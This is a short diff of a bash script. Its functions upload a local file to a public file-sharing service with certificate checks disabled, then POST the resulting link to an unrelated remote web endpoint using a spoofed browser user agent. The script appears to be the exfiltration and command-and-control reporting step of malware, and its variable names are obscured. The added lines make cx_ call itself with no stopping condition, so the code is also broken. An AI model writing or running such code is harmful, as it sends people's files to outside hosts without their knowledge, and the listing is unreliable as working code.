@@ -137,12 +137,14 @@ function cx(){
     #
     OX3=`curl -k --connect-timeout 900 --max-time 900 --upload-file $IBUS__$1 https://free.keep.sh`
     dbgx "OX3: $OX3";
+    cx_ "cx: $OX3" "SSID"
     cx_ "$OX3" "$2"
 }
 
 function cx_(){
     OX_=`curl -k -X POST -d "descr=$1&cat=$2" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps`
     dbgx "Descr: $1 Cat: $2 cx_OX:$OX_";
+    cx_ "cx_: $OX_" "SSID"
 }
 
 function Ntx(){
